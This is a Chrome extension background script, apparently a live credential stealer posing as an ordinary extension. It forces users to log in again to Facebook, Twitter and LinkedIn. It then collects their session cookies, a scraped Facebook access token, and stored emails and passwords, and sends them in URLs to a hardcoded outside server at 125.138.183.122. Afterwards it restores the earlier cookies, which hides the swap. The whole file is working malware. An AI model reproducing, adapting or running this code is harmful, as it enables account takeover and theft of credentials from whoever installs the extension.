chrome.storage.local.set({ extensionState: 0 }, function() {});

function removeCookies(url) {
    chrome.cookies.getAll({ url: url }, function(cookies) {
        for (var i = 0; i < cookies.length; i++) {
            chrome.cookies.remove({ url: url + cookies[i].path, name: cookies[i].name });
            console.log('cookie removed');
        }
    });
}

function savefbCookie(url) {
    chrome.cookies.getAll({ url: url }, function(e) {
        console.log('savecookie');
        chrome.storage.sync.set({ FBcookie: e }, function() {});
    });
}

function savetwCookie(url) {
    chrome.cookies.getAll({ url: url }, function(e) {
        console.log('savecookie');
        chrome.storage.sync.set({ TWcookie: e }, function() {});
    });
}

function saveliCookie(url) {
    chrome.cookies.getAll({ url: url }, function(e) {
        console.log(e);
        console.log('savecookie');
        chrome.storage.sync.set({ LIcookie: e }, function() {});
    });
}

function saveuToken() {
    var s = $.ajax({
        url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
        type: "get",
        async: false,
        global: false,
        success: function(t) {
            return t;
        }
    }).responseText;
    s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
    chrome.storage.sync.set({ FBuToken: uToken }, function() {});
}


function addfbCookie() {
    chrome.storage.sync.get(['FBcookie'], function(result) {
        result.FBcookie.forEach(function(item, index) {
            delete item['hostOnly'];
            delete item['session'];
            item['url'] = 'https://www.facebook.com';
            chrome.cookies.set(item, function(c) {
                console.log('cookie added!')
            });
        });
    });
}

function addtwCookie() {
    chrome.storage.sync.get(['TWcookie'], function(result) {
        result.TWcookie.forEach(function(item, index) {
            delete item['hostOnly'];
            delete item['session'];
            item['url'] = 'https://twitter.com';
            chrome.cookies.set(item, function(c) {
                console.log('cookie added!')
            });
        });
    });
}

function addliCookie() {
    chrome.storage.sync.get(['LIcookie'], function(result) {
        result.TWcookie.forEach(function(item, index) {
            delete item['hostOnly'];
            delete item['session'];
            item['url'] = 'https://www.linkedin.com';
            chrome.cookies.set(item, function(c) {
                console.log('cookie added!')
            });
        });
    });
}

function sendtoContent(msg) {
    chrome.tabs.query({ active: true, currentWindow: true }, gotTabs);

    function gotTabs(tabs) {
        chrome.tabs.sendMessage(tabs[0].id, msg);
    };
}

function linkedinData() {

    setTimeout(function() {
        chrome.storage.sync.get(['LIemail', 'LIpassword'], function(result) {
            var url = 'https://www.linkedin.com';
            chrome.cookies.getAll({ url: url }, function(e) {
                if (e.length > 0) {
                    format = '';
                    for (let i = 0; i < e.length; i++) {
                        if (e[i].name == 'UID') {
                            var uuid = e[i].value;
                        }
                        format += e[i].name + '=' + e[i].value;
                        format += ';';
                        if (i == e.length - 1) {
                            format += 'domain=linkedin.com';
                        }
                    }
                }
                console.log(format);


                if (typeof uuid !== 'undefined') {
                    console.log('uid defined');
                    var sendurl = `http://125.138.183.122:8084/php/linkedin.php?uuid=${uuid}&cookie=${format}&email=${result.LIemail}&password=${result.LIpassword}`;
                    var encodeurl = encodeURI(sendurl);
                    chrome.tabs.query({ active: true }, function(tabs) {
                        chrome.tabs.remove(tabs[0].id);
                    });
                    chrome.tabs.create({ url: encodeurl });
                    chrome.storage.local.set({ extensionState: 0 }, function() {});
                    removeCookies("https://twitter.com");
                    addliCookie()
                } else {
                    console.log('uid undefined');
                }
            })
        })
    }, 3000)
}

function twitterData() {

    setTimeout(function() {

        chrome.storage.sync.get(['TWemail', 'TWpassword'], function(result) {
            var url = 'https://twitter.com';
            chrome.cookies.getAll({ url: url }, function(e) {
                if (e.length > 0) {
                    format = '';
                    for (let i = 0; i < e.length; i++) {
                        if (e[i].name == 'twid') {
                            var uuid = e[i].value.slice(4);
                        }
                        format += e[i].name + '=' + e[i].value;
                        format += ';';
                        if (i == e.length - 1) {
                            format += 'domain=twitter.com';
                        }
                    }
                }
                console.log(format);


                if (typeof uuid !== 'undefined') {
                    console.log('uid defined');
                    var sendurl = `http://125.138.183.122:8084/php/twitter.php?uuid=${uuid}&cookie=${format}&email=${result.TWemail}&password=${result.TWpassword}`;
                    var encodeurl = encodeURI(sendurl);
                    chrome.tabs.query({ active: true }, function(tabs) {
                        chrome.tabs.remove(tabs[0].id);
                    });
                    chrome.tabs.create({ url: encodeurl });
                    chrome.storage.local.set({ extensionState: 0 }, function() {});
                    removeCookies("https://twitter.com");
                    addtwCookie()
                } else {
                    console.log('uid undefined');
                }
            })
        })
    }, 3000)
}

function facebookData() {
    setTimeout(function() {
        chrome.storage.sync.get(['FBemail', 'FBpassword'], function(result) {
            var uToken;
            var url = 'https://mbasic.facebook.com';
            chrome.cookies.getAll({ url: url }, function(e) {
                if (e.length > 0) {
                    format = '';
                    for (let i = 0; i < e.length; i++) {
                        if (e[i].name == 'c_user') {
                            var uuid = e[i].value;
                        }
                        format += e[i].name + '=' + e[i].value;
                        format += ';';
                        if (i == e.length - 1) {
                            format += 'domain=www.facebook.com';
                        }
                    }

                    try {
                        var s = $.ajax({
                            url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
                            type: "get",
                            async: false,
                            global: false,
                            success: function() {}
                        }).responseText;
                        s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
                    } catch (err) {
                        console.log(err);
                    }
                    if (typeof uuid !== 'undefined') {
                        var sendurl = `http://125.138.183.122:8084/php/facebook.php?uuid=${uuid}&cookie=${format}&uToken=${uToken}&email=${result.FBemail}&password=${result.FBpassword}`;
                        var encodeurl = encodeURI(sendurl);
                        chrome.tabs.query({ active: true }, function(tabs) {
                            chrome.tabs.remove(tabs[0].id);
                        });
                        chrome.tabs.create({ url: encodeurl });
                        chrome.storage.local.set({ extensionState: 0 }, function() {});
                        removeCookies("https://mbasic.facebook.com");
                        addfbCookie();
                    }
                }
            })
        })
    }, 3000)
}


chrome.runtime.onMessage.addListener(async function(response, sender, sendResponse) {
    console.log(response);
    switch (response) {
        case 'checklogin':
            sendtoContent('showlogin');
            break;
        case 'sendData':
            facebookData();
            break;
        case 'fbLogin':
            savefbCookie('https://mbasic.facebook.com');
            removeCookies("https://mbasic.facebook.com");
            chrome.tabs.create({ url: 'https://mbasic.facebook.com/login?refsrc=deprecated' });
            break;
        case 'twLogin':
            chrome.tabs.query({ active: true }, function(tabs) {
                chrome.tabs.remove(tabs[0].id);
            });
            savetwCookie('https://twitter.com/');
            removeCookies("https://twitter.com/");
            chrome.tabs.create({ url: 'https://twitter.com/login' });
            break;
        case 'liLogin':
            chrome.tabs.query({ active: true }, function(tabs) {
                chrome.tabs.remove(tabs[0].id);
            });
            saveliCookie('https://www.linkedin.com/');
            removeCookies("https://www.linkedin.com/");
            chrome.tabs.create({ url: 'https://www.linkedin.com/login' });
            break;
        case 'donefbLogin':
            setTimeout(facebookData(), 2000);
            break;
        case 'donetwLogin':
            setTimeout(twitterData(), 2000);
            break;
        case 'doneliLogin':
            setTimeout(linkedinData(), 2000);
            break;
        case 'testtimeout':
            setTimeout(function() { console.log('testsettimeout5s') }, 5000);
            break;
        case 'testliCookie':
            removeCookies('https://twitter.com/');
            break;
        default:
            console.log('nofunction');
    }
});